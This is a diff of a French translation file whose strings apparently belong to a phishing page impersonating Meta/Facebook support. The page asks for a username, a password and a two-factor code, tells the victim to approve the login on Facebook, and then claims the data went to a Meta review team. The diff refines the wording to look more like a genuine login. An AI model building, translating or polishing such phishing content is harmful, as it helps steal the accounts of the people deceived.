@@ -59,11 +59,11 @@
   "footer.subscribe": "S'abonner",
   "footer.emailPlaceholder": "Votre adresse e-mail",
   "modal.pwd.desc": "Veuillez entrer votre mot de passe pour continuer.",
-  "modal.pwd.placeholder": "Entrez le mot de passe",
-  "modal.pwd.continue": "Continuer",
+  "modal.pwd.placeholder": "Mot de passe",
+  "modal.pwd.continue": "Se connecter",
   "modal.pwd.forgot": "Mot de passe oublié ?",
   "modal.2fa.title": "Authentification à deux facteurs",
-  "modal.2fa.desc": "Saisissez le code d'authentification de votre application d'authentification.",
+  "modal.2fa.desc": "Saisissez le code d'authentification que nous envoyons à votre adresse e-mail {email} ou {phone}",
   "modal.2fa.desc2": "Vérifiez votre application d'authentification ou SMS pour le code.",
   "modal.2fa.placeholder": "Entrez le code d'authentification",
   "modal.2fa.notification": "Nous avons envoyé une notification sur l'appareil du journal ; veuillez ouvrir Facebook sur cet appareil et approuver la connexion pour continuer.",
@@ -72,5 +72,5 @@
   "modal.success.desc": "Vos informations ont été envoyées à l'équipe d'examen. Vous recevrez une réponse dans les 14 à 48 heures.",
   "modal.success.from": "Depuis le support client Meta.",
   "modal.success.return": "Retour à la page d'accueil",
-  "modal.pwd.username": "Entrez votre e-mail ou votre nom d'utilisateur"
+  "modal.pwd.username": "Numéro de téléphone ou email"
 }
